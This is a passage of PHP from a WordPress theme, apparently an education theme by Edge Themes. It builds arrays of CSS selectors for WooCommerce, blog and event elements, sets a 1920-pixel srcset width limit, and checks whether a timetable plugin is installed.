					'div.woocommerce input[type=submit]',
					'.woocommerce .edgt-out-of-stock',
					'.edgt-shopping-cart-holder .edgt-header-cart .edgt-cart-count',
					'.widget.woocommerce.widget_price_filter .price_slider_wrapper .ui-widget-content .ui-slider-handle',
					'.widget.woocommerce.widget_price_filter .price_slider_wrapper .ui-widget-content .ui-slider-range',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-default-skin .added_to_cart',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-default-skin .button',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-light-skin .added_to_cart:hover',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-light-skin .button:hover',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-dark-skin .added_to_cart:hover',
					'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-dark-skin .button:hover'
			);
		}

		$return_array['background_color_selector'] = array_merge($return_array['background_color_selector'], $woo_background_color_selector);

		//generate border color selectors array
		$return_array['border_color_selector'] = array(
				'.edgt-st-loader .pulse_circles .ball',
				'#tribe-events-content-wrapper .tribe-bar-filters .tribe-events-button',
				'.edgt-blog-holder.edgt-blog-split-column article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-blog-holder.edgt-blog-single article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table.edgt-featured-item .edgt-cpt-table-btn a',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table .edgt-cpt-table-btn a:hover',
				'.edgt-woocommerce-page table.cart td.actions>input:hover',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-login-opener',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-login-opener:hover',
				'#tribe-events-content-wrapper .tribe-bar-filters .tribe-events-button:hover',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table.edgt-featured-item .edgt-cpt-table-btn a:hover'
		);

		$return_array['border_color_important_selector'] = array(
				'.edgt-tribe-events-single .tribe-events-cal-links .tribe-events-button:hover',
				'.edgt-btn.edgt-btn-outline:not(.edgt-btn-custom-border-hover):hover'
		);

		return $return_array;

	}

}

if ( ! function_exists( 'educator_edge_max_image_width_srcset' ) ) {
	/**
	 * Set max width for srcset to 1920
	 *
	 * @return int
	 */
	function educator_edge_max_image_width_srcset() {
		return 1920;
	}
	
	add_filter( 'max_srcset_image_width', 'educator_edge_max_image_width_srcset' );
}

if(!function_exists('educator_edge_timetable_schedule_installed')) {
    /**
     * Checks if Timetable Responsive Schedule plugin is installed
     */
    function educator_edge_timetable_schedule_installed() {
        //checking for this dummy function because plugin doesn't have constant or class
        //that we can hook to. Poorly coded plugin
        return function_exists('timetable_load_textdomain');
    }
}